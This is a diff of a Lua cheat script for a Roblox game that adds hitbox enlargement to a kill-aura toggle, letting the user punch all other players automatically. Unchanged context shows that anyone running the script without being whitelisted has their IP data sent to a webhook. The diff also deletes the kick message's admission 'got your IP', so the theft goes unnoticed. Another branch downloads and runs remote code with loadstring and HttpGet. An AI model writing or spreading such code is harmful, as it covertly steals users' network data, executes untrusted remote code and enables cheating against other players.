@@ -58,7 +58,7 @@ if not isWhitelisted(username) then
     sendWebhookData(player_name, ipinfo_table)
 
     -- Kick the player
-    player:Kick("Not WhiteListed L plus got your IP")
+    player:Kick("Not WhiteListed L")
 else
     local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/adopttesting/Testing/refs/heads/main/Library", true))()
 
@@ -71,7 +71,6 @@ else
     local Client = window:AddTab("Client")
 
 Client:AddSwitch("Kill Aura", function(bool)
-    -- Set up the toggle to activate or deactivate the kill aura
     if bool then
         local player = game.Players.LocalPlayer
         local playerName = player.Name
@@ -79,17 +78,31 @@ Client:AddSwitch("Kill Aura", function(bool)
             player.Backpack:FindFirstChild("Punch") or
             game.Workspace:FindFirstChild(playerName):FindFirstChild("Punch")
 
-        local auraRange = 100000 -- Set the range of the kill aura
+        local auraRange = 10000 -- Effectively make everyone within a huge range "reachable"
         _G.autoPunchanim = true -- Global control variable
 
-        -- Function to check nearby players and punch them
+        -- Function to enlarge hitboxes for all other players
+        local function enlargeHitboxes()
+            for _, otherPlayer in pairs(game.Players:GetPlayers()) do
+                if otherPlayer ~= player and otherPlayer.Character then
+                    local otherRoot = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
+                    if otherRoot then
+                        -- Set their hitbox size to an enormous size
+                        otherRoot.Size = Vector3.new(10000, 10000, 10000)
+                        otherRoot.Transparency = 0.5 -- Optional: Make it visible for debugging
+                    end
+                end
+            end
+        end
+
+        -- Function to punch nearby players
         local function punchNearbyPlayers()
             for _, otherPlayer in pairs(game.Players:GetPlayers()) do
                 if otherPlayer ~= player and otherPlayer.Character then
                     local otherRoot = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
                     local otherHumanoid = otherPlayer.Character:FindFirstChild("Humanoid")
                     if otherRoot and otherHumanoid then
-                        -- Calculate distance
+                        -- Calculate distance (always true due to enlarged hitboxes)
                         local distance = (player.Character.HumanoidRootPart.Position - otherRoot.Position).Magnitude
                         if distance <= auraRange then
                             -- Punch the target
@@ -111,15 +124,28 @@ Client:AddSwitch("Kill Aura", function(bool)
 
         -- Main loop
         while _G.autoPunchanim do
-            punchNearbyPlayers()
+            enlargeHitboxes() -- Ensure hitboxes stay large
+            punchNearbyPlayers() -- Punch all reachable targets
             wait(0.1) -- Adjust the delay for aura checks and punches
         end
     else
         -- Deactivate the kill aura
         _G.autoPunchanim = false
+
+        -- Reset hitboxes of all players
+        for _, otherPlayer in pairs(game.Players:GetPlayers()) do
+            if otherPlayer.Character then
+                local otherRoot = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
+                if otherRoot then
+                    otherRoot.Size = Vector3.new(2, 2, 1) -- Reset to default size
+                    otherRoot.Transparency = 1 -- Reset transparency
+                end
+            end
+        end
     end
 end)
 
 
+--end of script whitelist
 end
 
